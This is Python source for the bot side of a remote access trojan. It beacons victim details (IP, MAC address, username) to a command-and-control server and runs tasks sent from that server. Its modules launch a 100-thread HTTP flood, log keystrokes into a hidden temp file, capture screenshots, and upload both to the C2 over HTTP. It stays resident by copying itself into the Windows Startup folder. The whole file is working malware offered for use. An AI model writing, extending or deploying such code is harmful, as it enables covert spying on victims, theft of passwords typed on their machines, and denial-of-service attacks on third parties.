import sys
import time
import json
import struct
import socket
import threading
import collections
import os
import shutil
import requests
import hashlib
from pynput.keyboard import Listener
import pyautogui

class Payload():
    def __init__(self, host='0.0.0.0', port=1337, **kwargs):
        self.handlers = {}
        self.child_procs = {}
        self.owner = kwargs.get('owner')
        self.flags = self._get_flags()
        self.c2 = (host, port)
        self.connection = self._get_connection(host, port)
        self.info = self._get_info()

    def _get_flags(self):
        return collections.namedtuple('flag', ('connected','passive'))(threading.Event(), threading.Event())

    def _get_connection(self, host, port):
        while True:
            try:
                connection = socket.create_connection((host, port))
                break
            except (socket.error, socket.timeout):
                log("Unable to connect to server. Retrying in 10 seconds...")
                time.sleep(10)
                continue
            except Exception as e:
                log(f'{self._get_connection.__name__} error: {str(e)}')
                sys.exit()
                
        self.flags.connected.set()
        self.flags.passive.clear()
        
        log(f'[*] Connection established with {host}:{port}')
        return connection

    def _get_info(self):
        info = {}
        
        info['public_ip'] = public_ip()
        info['local_ip'] = local_ip()
        info['mac_address'] = mac_address()
        info['username'] = username()
        info['owner'] = self.owner
        identity = str(info['mac_address'] + info['owner']).encode()
        info['uid'] = hashlib.md5(identity).hexdigest()
        data = json.dumps(info)
        msg = struct.pack('!L', len(data)) + data.encode('utf-8')
        self.connection.sendall(msg)
        log(f'[*] Sent client info to server')
        return info

    def passive(self):
        log(f'{self.passive.__name__}: Bot entering passive mode awaiting C2.')
        self.flags.connected.clear()
        self.flags.passive.set()

    def stop(self, target):
        try:
            if target in self.handlers:
                _ = self.handlers.pop(target, None)
                del _
                return f"Job '{target}' was stopped."
            else:
                return f"Job '{target}' not found."
        except Exception as e:
            log(f'{self.stop.__name__} error: {str(e)}')

    def ddos(self, mode=None):
        def attack(target, port, stop_event):
            while not stop_event.is_set():
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM, socket.IPPROTO_TCP)
                s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
                s.settimeout(.8)
                try:
                    s.connect((target, port))
                    s.send(("GET /" + " HTTP/1.1\r\n" 
                            + f"Host: " + target + "\r\n\r\n").encode('ascii'))
                    s.close()
                except:
                    pass
                    
        def run(target_address, target_port=8080):
            stop_event = threading.Event()
            threads = []
            for _ in range(100):
                thread = threading.Thread(target=attack, args=(target_address, target_port, stop_event))
                thread.start()
                threads.append(thread)
            return stop_event, threads      
        
        
        if "run" in mode:
            if 'ddos' not in self.handlers:
                target_address = mode.split(' ')[1]
                self.handlers['ddos'] = run(target_address=target_address)
                return "DDoS attack started"
            else:
                return "DDoS attack already running"
        elif "stop" in mode:
            try:
                if 'ddos' in self.handlers:
                    stop_event, threads = self.handlers['ddos']
                    stop_event.set()
                    for thread in threads:
                        thread.join() 
                    self.stop('ddos')
                    return "DDoS attack stopped"
                else:
                    return "DDoS attack not running"
            except: 
                pass
            
    def keylogger(self, mode=None):
        file = os.path.join(os.getenv('TEMP'), 'log.txt')
        
        def on_press(key):
            with open(file, 'a') as f:
                try:
                    if 'Key' in str(key):
                        f.write('\n' + str(key).replace("'", "") + '\n')
                    else:
                        f.write(str(key).replace("'", ""))
                except:
                    pass
            
        def run():
            try:
                with open(file, 'w') as f:
                    f.write(time.ctime(time.time()) + '\n')
                os.system(f'attrib +h "{file}"')
                listener = Listener(on_press=on_press)
                listener.start()
                return listener
            except Exception as e:
                log(f"Error: {e}", level='error')
                
        if "run" in mode:
            if 'keylogger' not in self.handlers:
                self.handlers['keylogger'] = run()
                if self.handlers['keylogger'] != None:
                    return "Keylogger started"
                else:
                    return "Error starting keylogger"
            else:
                return "Keylogger already running"
        elif "stop" in mode:
            try:
                if 'keylogger' in self.handlers:
                    self.handlers['keylogger'].stop()
                    self.stop('keylogger')
                    return "Keylogger stopped"
                else:
                    return "Keylogger not running"
            except: 
                pass
        elif 'upload' in mode:
            if 'keylogger' not in self.handlers:
                try:
                    with open(file, 'r') as f:
                        _log = f.read()
                    os.remove(file)
                    data = {'data': str(_log), 'owner': self.owner, 'type': 'txt', "module": self.keylogger.__name__, "session": self.info.get('uid')}
                    requests.post(f'http://{self.c2[0]}:5000/api/file/add', data=data)
                    return 'Keystroke log upload complete'
                except:
                    return "Error reading log file or no log file found"
            else:
                return "Keylogger is still running, please end it first"
           
           
    def screenshot(self):
        file = os.path.join(os.getenv('TEMP'), 'screenshot.png')
        
        try:
            screenshot = pyautogui.screenshot()
            screenshot.save(file)
            os.system(f'attrib +h "{file}"')
            with open(file, 'rb') as f:
                ss = f.read()
            os.remove(file)
            data = {'owner': self.owner, 'type': 'png', "module": self.screenshot.__name__, "session": self.info.get('uid')}
            files = {'file': (file, ss)}
            requests.post(f'http://{self.c2[0]}:5000/api/file/add', data=data, files=files)
            return 'Screenshot upload completed'
        except Exception as e:
            log(f"Error: {e}", level='error')
            return "Error taking screenshot"
        
    def persistence(self):
        try:
            script_name = os.path.basename(os.path.abspath(__file__))
            script_name = script_name.replace('.py', '.exe')
            script_path = f"./{script_name}"
            startup_folder = os.path.join(os.getenv("APPDATA"), "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
            if not os.path.exists(os.path.join(startup_folder, script_name)):
                shutil.copy(script_path, startup_folder)
                log(f"Payload copied from {script_path} to {startup_folder}")
        except Exception as e:
            log(f"Error: {e}", level='error')
        
            
    def send_task_result(self, task):
        try:
            if not 'session' in task:
                task['session'] = self.info.get('uid')
            if self.flags.connected.wait(timeout=5.0):
                data = json.dumps(task)
                msg  = struct.pack('!L', len(data)) + data.encode('utf-8')
                self.connection.sendall(msg)
                return True
            return False
        except Exception as e:
            log(f"{self.send_task_result.__name__}: {str(e)}", level='error') 
            self.passive()

    def recv_task(self):
        try:
            header_size = struct.calcsize('!L')
            header = self.connection.recv(header_size)
            msg_size = struct.unpack('!L', header)[0]
            msg = self.connection.recv(msg_size)
            data = msg.decode('utf-8')
            return json.loads(data)
        except Exception as e:
            log(f"{self.recv_task.__name__}: {str(e)}", level='error') 
            self.passive()

    def run(self):
        host, port = self.connection.getpeername()
        self.persistence()
        while True:
            
            if self.flags.passive.is_set() and not self.flags.connected.is_set():
                host, port = self.c2
                self.connection = self._get_connection(host, port)
                self.info = self._get_info()
                log(f"{self.run.__name__} : leaving passive mode.")
                
            elif self.flags.connected.wait(timeout=5):
                task = self.recv_task()
                if isinstance(task, dict) and 'task' in task:
                    cmd, _, action = task['task'].partition(' ')
                    try:
                        command = getattr(self, cmd)
                        result = command(action) if action else command()
                        if result != None:
                            result = str(result)
                    except Exception as e:
                        log(f"{self.run.__name__} error: {str(e)}")
                    task.update({'result': result})
                    self.send_task_result(task)
                    
            else:
                log("Connection timed out")
                break
